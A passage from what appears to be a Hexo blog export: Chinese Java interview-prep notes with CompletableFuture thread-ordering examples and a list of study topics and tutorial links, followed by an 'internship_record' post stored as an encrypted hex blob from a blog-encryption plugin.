TimeUnit.SECONDS);</span><br><span class="line">fixedThreadPool.shutdownNow();</span><br><span class="line">fixedThreadPool.awaitTermination(<span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line"><span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">log.info(String.valueOf(counter.sum()));</span><br><span class="line">log.info(<span class="string">&quot;totTime:&quot;</span> + (end - start));</span><br></pre></td></tr></table></figure>

<p>16:47:06.880 [main] INFO com.example.demo.TestThread - 10000<br>16:47:06.882 [main] INFO com.example.demo.TestThread - totTime:36</p>
<p>线程数量下差别不大，改成1000LongAddr更优了</p>
<h3 id="控制三个线程的执⾏顺序"><a href="#控制三个线程的执⾏顺序" class="headerlink" title="控制三个线程的执⾏顺序"></a>控制三个线程的执⾏顺序</h3><p><a href="https://javaguide.cn/java/concurrent/completablefuture-intro.html#%E5%90%8E%E8%AE%B0">CompletableFuture 详解 | JavaGuide</a></p>
<p>一般使用join() 或者  CountDownLatch 实现</p>
<p>CompletableFuture 实现方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">fixedThreadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line">CompletableFuture&lt;Void&gt; futureT1 = CompletableFuture.runAsync(() -&gt;&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;after sleep&quot;</span>);</span><br><span class="line">&#125;, fixedThreadPool);</span><br><span class="line">CompletableFuture&lt;Void&gt; futureT2 = futureT1.thenRunAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;after sleep&quot;</span>);</span><br><span class="line">&#125;, fixedThreadPool);</span><br><span class="line">CompletableFuture&lt;Void&gt; futureT3 = futureT2.thenRunAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;after sleep&quot;</span>);</span><br><span class="line">&#125;, fixedThreadPool);</span><br></pre></td></tr></table></figure>

<p>等t1、t2完成后</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">fixedThreadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line">CompletableFuture&lt;Void&gt; futureT1 = CompletableFuture.runAsync(() -&gt;&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;after sleep T1&quot;</span>);</span><br><span class="line">&#125;, fixedThreadPool);</span><br><span class="line">CompletableFuture&lt;Void&gt; futureT2 = CompletableFuture.runAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;after sleep T2&quot;</span>);</span><br><span class="line">&#125;, fixedThreadPool);</span><br><span class="line">CompletableFuture&lt;Void&gt; bothCompleted = CompletableFuture.allOf(futureT1, futureT2);</span><br><span class="line">CompletableFuture&lt;Void&gt; futureT3 = bothCompleted.thenRunAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;after sleep T3&quot;</span>);</span><br><span class="line">&#125;, fixedThreadPool);</span><br><span class="line">futureT3.join();  <span class="comment">// 确保 main 线程在所有异步任务执行完成后退出</span></span><br><span class="line">fixedThreadPool.shutdown();</span><br><span class="line">fixedThreadPool.awaitTermination(<span class="number">20</span>, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>

<h3 id="⽤-Java-实现栈"><a href="#⽤-Java-实现栈" class="headerlink" title="⽤ Java 实现栈"></a>⽤ Java 实现栈</h3><p>懒得写了，简单</p>
<h3 id="加权轮询算法的实现"><a href="#加权轮询算法的实现" class="headerlink" title="加权轮询算法的实现"></a>加权轮询算法的实现</h3><p>加权轮询核⼼类  WeightedRoundRobin</p>
<p>算法流程：<a href="https://blog.csdn.net/JMW1407/article/details/107787546">服务器负载均衡——加权轮询调度算法(WeightedRound-Robin)以及负载均衡算法的C++简单实现_c++负载均衡算法-CSDN博客</a></p>
<h3 id="⽣产者和消费者"><a href="#⽣产者和消费者" class="headerlink" title="⽣产者和消费者"></a>⽣产者和消费者</h3><h3 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h3><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><p>先跳过</p>
<h3 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h3><p>hot100已完成</p>
<h3 id="LFU"><a href="#LFU" class="headerlink" title="LFU"></a>LFU</h3><h3 id="Manacher-算法"><a href="#Manacher-算法" class="headerlink" title="Manacher 算法"></a>Manacher 算法</h3><p><a href="https://blog.csdn.net/qq_43456058/article/details/94588721">彻底搞懂马拉车（Manacher）-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1YH4y1h7MU/?spm_id_from=333.337.search-card.all.click">算法讲解103【扩展】 Manacher算法、扩展KMP_哔哩哔哩_bilibili</a></p>
<h3 id="四个函数式接口"><a href="#四个函数式接口" class="headerlink" title="四个函数式接口"></a>四个函数式接口</h3><p><a href="https://blog.csdn.net/qq_38983577/article/details/81806012">Java8 最重要的四种函数式接口及其作用_java8 四大函数接口和作用-CSDN博客</a></p>
<h3 id="反射创建一个类手写"><a href="#反射创建一个类手写" class="headerlink" title="反射创建一个类手写"></a>反射创建一个类手写</h3><h3 id="CGLIB动态代理手写"><a href="#CGLIB动态代理手写" class="headerlink" title="CGLIB动态代理手写"></a>CGLIB动态代理手写</h3><h3 id="AOP手写模拟记录接口执行时间、打印方法名、参数、传入值"><a href="#AOP手写模拟记录接口执行时间、打印方法名、参数、传入值" class="headerlink" title="AOP手写模拟记录接口执行时间、打印方法名、参数、传入值"></a>AOP手写模拟记录接口执行时间、打印方法名、参数、传入值</h3><h2 id="评测题目规律题"><a href="#评测题目规律题" class="headerlink" title="评测题目规律题"></a>评测题目规律题</h2><h1 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h1><h3 id="GIT"><a href="#GIT" class="headerlink" title="GIT"></a>GIT</h3><p><a href="https://liaoxuefeng.com/books/git/introduction/index.html">简介 - Git教程 - 廖雪峰的官方网站 (liaoxuefeng.com)</a></p>
<p><a href="https://learngitbranching.js.org/?locale=zh_CN">Learn Git Branching</a></p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><h3 id="K8s"><a href="#K8s" class="headerlink" title="K8s"></a>K8s</h3>]]></content>
      <tags>
        <tag>java</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>internship_record</title>
    <url>/2023/03/14/internship-record/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3c2318b200af9cdf5a0ffd1ac38db12324766f52cb631a6a18c07c1dca15d003">7f5f45840a319ff1b11e31e6f9055829442b58400f62e69ca4fbef3680b89e97791459f6dfbbbd3fe7a420600eb0e2ad48eeb6cc5ace511cef594fe64754fc6a451db2e782fd51da352c967bb6d5c0e0847fd715da199950df56cfd92f0f2ed76b6a0682413ecb1e96977a38fb0accfc33a7ebdd17c8719544025558065197826bf55e4474ea9c1fe3bbccb82b5bc527f601c20ef689350fa946d612de6405e30be1d22dcf46c231c001a130b4671b3996ea0669430ed037230ce416b934a0a6e12c268af23a0259262cf2c0b4fb9db14f2ddaee319d2d0298ed65cae4fcb94e7ef42e3b4e087760ded26eb7211427fbf8bba70d6f71bd934e200c3697f17f45b7a58c00f59343a5c1040c8f51a397b3ebc00ed527331f1afdbdbce7048d48ae7cc8d315ce4d9abfb5522cf3fabf33160060e0ab15e00a18f4f3e4b7dad77ca5d8984730eafffc2c45291c033dd8efc0fa005bfd097c814988b2ad9fa77f9d884157acb5babd1d96f40d2c316897f2508ad797bb7c06d1dd80589ffee4cb819207d4cdbb16f7c276265c10fb5fa678d570a719b0ed31d69302b136db833f4284c62324bec3b3e3bc04fd24a4b8803f3160b6f396c9717b8abe2d2e27e7af4eebe9a68d9b8a66cfa05cb09597c3a1af053a199306c9983d29608bf6253a1ac5f1ab3dde04af99149ac047558b1d8d6eb423a5d07dd75fb2bc04fd0fd857b114f042dbdfeb592a1ab99c39f5844bad2187aa2abe44d3b15bf853e0a2a320a0ab53bb66ef0a7fb34c60bd12aed896a5b02fd6f22956aad1eb6b0c140f80b0297601f844367985471a58c514d304722d8b558b14983bb3c116343df73a585d84dc6a4b3262998b7f7183e9fa10c564b84263f7a995b9861c306e3fc9597e2d90bfd871287e96d10bd0ae21719d98113d0fb5898a305eb04ae9446960656fabfe2fa91003d01fdaf9c47854b06d695e75e4417090f28e3218ed15b2702269c728f3894e7a7dcd175b00351238871c81b37e5ea40f82b483d507e005de02b30336e255759508dc30cfd437693ca7791512c3b7a6b770fcc21092da95da3d2d2d4529a85701e28fd0a07441ef61e1ea8dfbf8d6addf9abea8a936d4969456c3724b13ccc2eff78297e3fb35a01ddcff7ec795c41803f147219532a419a046fcff40d59af2651b6e5460af3147a9731bef9750c510c27506f390d7515b628949c4cd31fd0c7937a6e998ec4040a0bd6cfcd0ecc1a23a905146e005c2deeed3b9ccb960573ae163944183b1296566c3cc432d17c647e5c4bbd6adaca1a06ecd1e1cfc432c9b22b88d0bc466e3d419ec579a9538abd8d2ad1b1c6bb9047429675a733bb3cfcf84af7f35b6028b75dc66d8ab50fbce2e746351c64799163ead670fe84b4e7e8725096062f358523377a351e445eb0f550ba48a0d265e4240d33539a27b73103c369d8d21291628963276797613e0b4d1380cd6c7db63ed24c0a2772b987a7d9c414a18264b17cdbe715afb40db0bc4965443f10b6d7d729ba692e31e29dd93e29e008c8b7cf7630f692ebb7156ca9013051ebb6ced93331ffeb72a342891602490b1d78027e32b555c849ed6310ac3e0696cc423f17a196b9bf1dd824b260356796b8c965a2292d4bf050d02a8d55ada36f7c26d0e06bececb75bb6aef40fcfe4a4a14526aae24272760053e549ccbc7fba45979620486f8d4d66c47e11a30432c4ae5de61178231b9235ca7a8c439de63c76001a20a5543900eb1bd752b9dddd207c07d5e0cac35d6995b0b9d50f099fec2f6db633ad6a478a1d6a420a704ea98b583e11bab4382597d6ef8021fb5391cb390844c32e0a593ae1749e639a7bbccc9b1e96de288ecc5f1a47e528987be58b3157341c0b00df7078e40b4ce552132b642ec2da05ee8fc98484c033c3469e8699080650de14cc578d030756b9e9b9652fe24e4ef4c1346bd1e50c355085869717087d010da35caa937c5d560e96e55b3917dafd63864af3b2aebad0501c667e24f061f302d4054ed3601617a810a54f97a98ca0bf6de52fb6f5facb16a8a25b1a4b19565337f76e166c61c305205d7f4a2fa2551099ffb7880d418b7f37b349a6b845f99173da6f7bae8e1723aebd2dbc60617ad7d787cad4c44e669de8ca6664014b2870ced3bd03eb05affb72039613e2fd88ca8ebf2a687123d06bd06b3b4229036c3722e1355d7c7e4934178ccd69215080ec41cf17b0832000349cfe59d81d330745dff3525d651ab7e7d12d7526c36661805969afa414f1af3d02fed27522c35e1e6a9ab9b735a61be7bea3bd0942c47f1cb24309a54c2f33ce5c631c1e3eb49863ba1d00f16ff6158127f915d0fd30f08e6999f61d31cbee68517300afcc1c03ec99847f621e924db1b4d8091c67fd0bd864d748729af481d0f979ba6a1f99a1d69a5888794e41c96385980b0feb0570def41542abb60ea80ba42fffe208c97f4ea6a96d65a753a288be49b35665de4a36d1ce96e4740f8211d0ee82e4c38d1ec6e610c82c85331061fb623bed43c346cf5bc50c8a30f7a66f25147eb538e99517509aa93821d29edc2d288d6f6b777d7fa95ae874d333d8826568bd550d724448240c38a7db55a4ad7df2a0c79d91e8408063aee59c002472c1aff0af3c52fdc1b5e7ebec8bf15d4c676906241debd0c64d1cb3ca6d33e67f6514dc0949cb8175efb4eee536268f6e5c03579e7d3a300c7d39647b606dca3adc5c02a8c0b138f254f582922450eab186f774a7706aa982b5db6d42c4aad2fdaa0436ad76a4a5481633e1db96451b301b2989f4591cee83d490ad0508add1d1388e60331a123ab70f8ab83c8e32ac413bc378fe549f34854205ad519d3e08f73661aec244896e4860aa5ffde93c8c45e3fae3734391a11f13b6604d788ade57c6c6cc9d5adadfc90e7ba2aeb6e09b5752d38db7398b9fbd4156bb42a2ea5e0b5e2d7a39f748f466d7f50bfc2dde8beb9e73c76b63b32d9704bc0830282ae1e6bcaace0e6ca75cf4482ad86987fe84f8fabfca0f27621eaa25cb27c587545a1dfd41fa9be8d986ff7b996ffbe50177c45e0ac0970cba88e4a2d8ec3d41537017eaacdd819abc50b8aa4619ff69ebfedc43cd0320e512168c5b5e10256fe843c3853c8b115d2d6b5e4c956ae5f6bcd3e9dc4984b9e1022c6e8d093140c76a48361a0372a62a5532e42b3636369ff2f0424ae0d8a9a1167c27a56f05c395156e223e68d1d02d647d7c12c3ca9c44d5bc1a2f9a0c7ee6dc851f76f5421d368a05207880f356ce43530d63802cdac20b2d72fc4f12b8c540d554b45eaa5dbdff42cff117686c74e584b40337261b42dba029ab14cda8c9ded667198468adfa01cccd618954edf0451e0b536596558ace9444bd9b2744f9ffa6ee3ea8c3976afeb8d7b40459b485259f94af4526ffe88e26bc8893292fea5e9e28b4bec20621da66cb3bddc0a9f5c045e06a47854d69cf8d2ea490f59a12a688d98b6976fd66ad08fe3bd4986fbea21c1430885010c3b725908e8e33c4ae95617cd6eae9405d8e7d946c32fcb23aefc1d96a89761afcdc247498798ce0cc1115fd442037927fa378d2c37753fea389435f53a297455f7ab7d5d99f0b8e302a8393d0739eabca014375dde7e6cc7a298dcc9e67f8605c70fdfa42b91898cbe29249a4f1057fc3118b6d5fd66789bc1059be1d634295339f402ae819c12d3767b815fe4b99fff1ba96151961046588ae8d06f4c30f104de9fed4e6464d464a2681871d19420b797388b4bebc82fe5d7b014c9eee2263965a58851c2615165ca1a2de0e7bd0ccdf246d491d5971996b48ae903474044f6ada68105da01df7300b0a5547030d516d4dd49aadc7d0a4fbbaed6f60b9f282d167827276d36ecda3ebde116e707f48d1d6fc253cec4269781f4f9ac10ffa20cdd01a5af5c6a85cf8d282d304eb1f66bd2401b516745778caa6025eabf6bbe1ca0901e6abdb1d61822c80164099cf01687fd085b73150305a22d4c55593c83b89804d2c74249b97ec1cada91e1b5e35662145891fcfcb2aa2ef3b2d496c67a89b6a78620871a598054ed80cd6986c3b3fe483ad005f18748e9c30a2575b9bd9f526f28ec9a74512565afa4ea334ba80ed5f7e2b0317d9296b8ca51cb546a34d2c0b1c69c602f542637683a543af7d1ee38d23f640970885240224b077660ca0ca09625fcae31092be624df877a68a40cef90080b7f3e17da4500745b84b36bdc2c39c9356d990b68f7b1c042d18a6cc6fc2748e8f189f898ca9470aaf7796c5c70263916b93abe6705b2d499dd61676aa4c192a2b157d9a82d2854ea4fbe291f89cf1e516dd1ea70ed614820e9b07bc5d346e3eac3b1b630b29110e52a94658d97f89244a72cb8d46a87ac6734372497679e610345a6e6f969d803b656e094b3bd6723669ce11c3c6a499b5cf3f2b254ace2ad3fb3d84ba1d43df19e54366629a35b766a4856029e0cc37409425f565c04c9bcb5a212eac8c4225bc2e7cc70aeb405ca6be3c37d747aa092cab335892e2b6632d3b0d4427e62791f4df7004dd0067feb76717f8d783b05f837a3154b1a27062b83c255f7af336c6485ecd489b539f8a07aaa725bd50bba06d16558065baa8df1c63dd454b18709e8fcb8a1520e1bc2db98b9031cfbb5cce6c587b500082cc7fc5db023bae78c330e93129a6b19a04a20fd5b258543fbd59a6d455bd199ffbba3d87654b09bef08dc98f35165302449eca89bc12c4d77db40454baddd1f69b448d4f5ffef6b6f153ecc1085a45ae3d2601b8b20ef1b3b8a2b9de6210705d3721a342df1f4acef42d13e948b66e9bed7f451366b9a87d5e7fed2210b8ddd7da6ca2c621148898bec001af8bc576004334002987d35b1404fd973f39ae4bedd8f02cc1e06c4a380206fc480741200c4da12460ea378e12d4686a684102b4c8461c1673589b6889aab7d84034a295d72c5b5d5e77afee16b878ee52dfec909c3eef0e3a3dac1453e8ffe78335973d98f6dfeab25370f3a4fdfb5eea5b83be57b33bc7c6f3401910c198e85a815aedba5b2a764606e53c86a180f8f3e817c376e151980dc6b9ec1b0db204808f79945670b9deca0b09414af9ba60409f8dd8b4394fb33a51949f8860dd764d89705f9f6f76a1826d3632ca369a7068d2220f97aeb88cf28ab62023ff7b0ddeb9184d632a7c223e7509e0c0b824c2356d2bb9e13e9a7fd0fc408b29a7c57cd9ceb567d81c5d5a90085e2480f59c07bfe08c0ba405a7498c4fc2e54c9632e425251e56704bdb9f7e171e918e8837640b09e69e58c81433fcdafe7e1ce8b5f3e5da0044a24588e37f5f73c086f5dfc2e4eca9d24f7de185db1f788e51ad5fdbbeb244f80639e569e22346c4d8c3aad0d9657959a5ed11c9032a3adae3ed7becf732133108f33365577da7b8eabd5de14fa3e5c7615fae2395b0a74a1bf9218c0f51e9e356f66dbaa88760eb6e612d6b93d38d7a067353b14b7e4f56892231ca61b3269f8cce584aa13aef748c165dd30a44ae093d2964dfa04331c04cdc6ca93d1f6a7b62607fdc2f8223debdb8c2147a2c3ad4f3cf4298e6d9fe85fe0a9184534f4a8f885312ed5642109849d671f44a11528f7afc7c9f62655c97b1465ffcd4d814d3b180b7616abc580477ff851f45ae639c9fae67ee7e0cccf534790968bed2b58b4cf766286094db88de6d57402f3ccf5897df473f46b76829f7ce0ce78e9130405e1a00a641263f9bf1741fbad2ecd01a38375a4408890f61af93e78672eede6c5285bd8f31f1405f53c9a4642cfa7755e2d1a86bc45e6731c1e6cab901fd454713ea1c67844f32782a7d7d6e94aef9c62a68ecd2388b073634e79746293cef20041425c8258666d8bbb729a6dc4533a25af717f0ddd3f651113bd5b1ec1fcada1af89e8a472cd44f59dacc0c4bfd10b4428967e17be54c97fbaf60bd3e1aa67b264b429f7ceadcce5c492cd0d02ae44c99a5ba6c8b6f23900ac779aab45f12a9581f5ac7f8d651bd435c00d737e521b15039a74bd5581da44663c3b0f60638192bc3d1f1a6cf95a8abc1a55fc89bf456676861f036c0517759ac651eebae72c6b64de933807b927ceb04c0b18c389ac544fac7759230f5d170fe364f48b2d7c61aedda9e579d4b53d2d23a9c5333830af7f446409c0faa222369cfbbc887d2ddbdcb0b1fb2bf43961a67209646ad0e427b2cd70ca9900aec3b9fb624212f20b5b1c298aa41d74047c5b27c630b6951fd5e1f81e98ff9228e7b85fd97040f765a2a9cc87b8de355ce8d52ae54ad316a13c69621a8257d5b7b8097b61ab306aecc687d049156360e9c9bc010c01e82ac316a37fff76c6b5db12adced0f2659294a6d1154917442560405d1135f59be6bd5a009a8d0307b51391c85e3fccf393a9f372159382aff7cfe6928fdf7b23bddeae6cbbf99d9feaf4f774c2ad06bf3065739161fe5d0a0ec24ec1a95477a5bfc2e211dc954e2b6e6377e1352890093b0922eb23fa614ad3f29874ca57537e14133e2a414e2b75a93d512b628b5af27f8a5f2e5c2220285ec11f942a4f172077fed0ebdab172dc1a711d6c01d760ebc69c0f1221497b42ee7df629bdf8c9a3b4783486ad52b72f53d41d702c44980a2811419a3ee96615e26daefb1071825aa85216c62db5e94ed7f70f968cea6c095c5c6d8537cee4867df84a517b18b71c16c2fd6770c2d13552b09b258d441d6802a43517ec00dd8fa1312b940ab88056a2f56decf011735932ebcec9961467091c7fef069eb5257bc5a4c291b89390add5beea8636d739471e4dc709396c692f3d1321d7c0a143e219114f7e5beea4c3222f926220ce0ab086e852903aed0b553cfb1d028f7c1bb5da79fe0593a2babfe2b5f4d98327fd6c253d73c84d081b00e4a7fde5613468ff67779be262ff6ed53d7f3cc977dae1c55a50425922e08e6b1eb020bb7ca74121cdb01d3d8ce4e303d17bdc4a2c3906409e9b1ee68b934905b67fc4493757dc1a0da79935aa9980018b5d77fbb86f4bc76aec1ee881ed657b3d2d789b0283584ea8b125c9dff7ffa5a96356032eb865e9fb4b159e7e2380a434cfbe792eb202e868373c886c7a3bf3099180b78169de37aff04f0e5e4a81ce50dc03e38638571f81bf90526803d4dd9d3c612b0d237ccd0920773c40043416897e296ad0a66a24390b7e88c805309cdb6ee669175853820d38915f1ccc449b42117ca5f5be46ed90d3d618458a6dc5aa2e93268260c0ab91b6e89d54ae31ff97ff5b7e14d5a32fb39332ac260713169309efb13fb03e7092a0753e02d9dd647ebaed715d3d9665f4ab11e31a3df6dd25a2f64e97ef2daa9ae5a6cd15695f888e2433ac8f947ceb54fadd50995db72f16ef73deb59cb107ceab657ccd5b25383bd7c3de16903cf35f4819a1ac700b630383351eb1387f8448038fe0d5747fc1446b3fd90c984ba9a729f7709a5a72c699b4002c738267adbdbdcbf9d619cdf12333539e15d482751530c569cdc9feadf7b06bdc14992991dcef4e7b31dcf0ecd5ef1f3a95e01cfc08830acb577e010edcc074c94a883b064609763852e04e2d034efbd9b9405999c9254089c4a5f2298fe6f8a72ce24edff6cdbf8bcda187f0eb422d05a561ab89aa3b08bfbab038a5c876dc87bf71174572335844bea832a4442224ca3b53102641642214a50e72e244c89f7f0b70aca1f9d1ff8e5e0cfe6c3e286685dd1c245eab7b7ef0e1e97460bfc9e21d9a3bfc0f9d9e6d5844644f2f1c07a0c773d025662a55854454e8f3b86568ed022aff35ed1482b0214e4c2e8fc3342013776374107f408522a55acb32cbe0d577d7464850224d9702f123f2274915ec0879cb975d866e42e3157b9e29777b6fcffd5990aa3a4713d77720edd0a59d68495ac0aa4be2fad9b6286f0e31e3b4ae1e2b952ced65d5f62801d9d645d1902a68484b4ecf053ef9f1c216cb099ac2a474e2860c7bb6475ddf20b20df405473db61053b8407c8958e17dfc8e9bef7c1ccbce1a7a341dd8ebe4e6f8dd383717facc6ae8a209671ddb299d915cfcfe74a2853fe95b6ef3277f13015727a448110140372ab7b4a49e4844c283480cc992edd19a136af5e043908302a3239a70a47e6dc26b5a13c8f4e636b23a6132b152d824704011034a10551519a72f295d1ac0f79a8055fccc2a9314485a29391f620d2042e0405fb7a9683eac6baeff0e250fae7477e9b66a372f7657821d0c115850d65bf226d7a7913a6d0d0cb927ff4e296a0c0bca5cb07ada298fbd0d13b1b54fab6f6a747500b1aad5520cb026401857c86b6515d794388fb931a3e756eb5dde21b53ab21855dd67bc6f2d41a666a76e90e200c14c772d7bfa0e95e12d55f90ca23d0ef8d21d34b680652a0723b4bfc8654e5974c488a5b7de870a5f44ec8e6e86045f0dd870e8f54c4124da4a4cebf28c4962b12c79a3c9fcbaae14ab63d748ad42df105b24ba4d17f1a187d980f3e6bca1f5d9a8e4a2ada1e4786d75af31e6ad92705a3fe240230805b45cb03e3f97e7bcae8be3b20bf826bbba392d60214b01ed55e43d2e3be30a03c3a4858d864e8b0e08184edebecf852cd430e4cc93f5a6fe1a6b14f6edf799d0f68871ab01f6be2a6d3f08633bff27b80cd9f8c54716be07c0d6fc8bb077b612536a3f69f01b8963adfffa5f4c3cc97cf233b68a92ccd98060d4c4258d5955f8126e7fac5cdd816b652a15fe98f3d3b0225e0564ae1a27f24176a38f280cd048d75186df63498434df4a1f4956ab8e67cc165c3d3a80b0641c35a239d7145887d8ba674de2534e0c4bf87eb9d6eba43e3ed30c927fb92dbfa5baaabeffa05a4c0fd698914fac567ac47f10d109dc1ac9a0bd99195f29ab00b2cc52c3caa58522af3a925929aecd8c58e4d83731e975bcfa9b6c46823e7ab7515077b3a7d2a7726d44502c62e62f3fd9947e3a3805c2556024467d97bd08c24dfb298a991a907fc959ec55948ec3bd6b69933805e505bdf1e405e813fd91699a1e63067fce78189598192223a803859472c0a0cf9ccbfcdd14f727328b62a9ffede8650e8e2652baf990825fecfddcab1785bdcb22b7e6c55bec287f09cafaab919abe106b2f698984d668d8bea6a8bb0828f44b36f9528be9907ff47a79c43131214b0f264d5f10fa8bbe3db277dce8e05126307985eba11dd8b9ce604a2adef661ac49e27fba85f3584fca35a03b6726ed95fc32fa35d83021d0ea753a9f0d628e5c52561162e8f5cefb92a5da3cfe66a6e0bda225399dee213109104cd7bff1199837d7bfadf55b02cb9d1fa54f36ce391d58847969080788771b0af1acb8063eddc213064ed73f5206031cd7ff97ce738b3088e08d4c7871b7d7b6ac013eabfcb66d0f2416304ae4944180cf30fded0d2485fa79d7be18f2087a3bccd61b2900e7d95192b40b749c37692852062c329783d9b1eb2369fec413174dd2476b5770d467aa2c9eca2a788ed8b20ce6aebac7469b5cd001e2dda777f13262f67adda1f5837bd5403c06b5d42fc0e92b12ea72efcc52ec41ff598d98be85b2f3da0c8c64c0a2a4522a16e301a36b7d52f2ad6bf8674fc39f2b2e47b41556e7014018c51b4f8da0b3a7061340b518fca51262aafbab354bd050acc07ab854be48a8e157d55d322f03c0ecd32511db35b0f0ee087749dff777c5a832157a8bba48bf992d6473758e6fe0034e01ede7d27563a313ed2b68c6c7143bd45532ad3c65bea36e3a0d1101d29891c1cfffb81fb8a45dc16874783ca5a18523e5d6f28d90d984196c33a16b828e6e11729ae96f664e27a4881d4616965309a608f8025c3c06745c98b0d4d970f7bf224c4ed310fd6ae50fdd45cd0d0670c9e20b425fb32912904eb7ddd593a976e503c477509a33110ddfb137927e789c852122432642bed940bde9c299d10f212c943a71ec90dbf9b1a0b3bb6a6d153a60b864db128922586854a6a1b8798a945b9c5c169b352623b45fbd8355ddef6eadfc7236a4914f514fac3418ea2319af56e555d58f95af556cbc5379561a3659c6316fd542245e303011c6990ec7528d707fc5c16658332698f4a1d37f2b549b67831d3e547e5e6dbe34ce1e2c3804731cd68faf7c2b127eb138ec655e75059be2323e2bc4b7b758687255020faeb082acb4de7de468ae4d683ec526f80024f6f2f5ba9223ba546b398ad4e5530a87346dad377464023b7b07101ca93f1d630ef00e2b106dedd400f7ac4d27abbfee11cb246c3c2bdc6be5cc2bc3ac98597ab1f6f5f1435b50ea15d13228c7c6205aada5d0241a32e1aef1e0055f278ffff3b99f20b975eea4900427a9e7c7a2a02c55c668c7e972c40727822592b7d7846e866c16dee35becdabcec5ced4264971b4804622ed8236a637057d3ca966d292d2f25c5fe506f0d4eb9a057041242adfc7c35bb58a50550da1fe3439728fc2ca02b1709cdc7b9358f8416bb2a86d9a5f5e0c2b232b524423814e0363c064d15e62117afa4a04214bb5bb50de763a83435a97805476e34971d34ae8800cf7eb6a8afc887a8316a931e9e45d75b09dd0910b9b15ecb101bc04dff625db98f099b2564279d4e716658c7a01a6e3c0dd85657026c7f740b8bb19fe43a5d787b08fd720f3aa3d8f438db4a3f75a0c2fd8d7cd1f370597e0afcb0a97eee6a80ef2c1b166a16ba384332af58356cc208ff94096a7cbed9007261c39001887af4d62cba20a43bef203d1294fc4f10b7b5d9f2c9d881e06447e8a35f653a92f8ae317bed8e5a9b715e8b37736dc73e3fb8f2274562e2be2c8a55f9f69d0a85796bfb553ad2f3ec3fe91532a3c804fa53e0336fa8954c6e70efd642d48012eaa95dd57ce651386b21a8e3fcdc76a668467d1162d35062337cf052168def882cb777610a699cb7287300a242cc1a861c240d944dabaaa620bd708e13f8db849fb0b94dc328a5a409e147ab91cc44885288d21454a116c83b2c43ec378eeb69ea9c9ef86267bc91898e4cc1665a3e5c2d5bc7b637b8d4b83d268f20abbe2d8361b18767602d1469ecca3484f09bebab1f3c0355ebf283c5484bd56fdd56855a00f54f467a8ce553eff9fa2d57dadf74488b0dadade20a91b27f081023048dc000e08cd73d1278e64d306fc7d6aea4f71e794aa08f0581b1cbf596abc75acacb148c05569fb2dae8b074c696ee9f3fe4f04360bb7faa78aeb4792b1b70e689de2884d691705c91ebdb64dfd32a180a89c82be773f4947a652ff3dc5e33bf5e8a534009101dddfa8e2c9f10dc0f14492756af2817ea1b7202216111608d324609f64822da22ad95263fecd515fc1f02baa850796b6c2978af4b453bedf174453472003f2149360772ee61d5163dc0ea65867e3607980ec4d00b20a6b2b862b07b4e82e5a479c01c22de986abaca3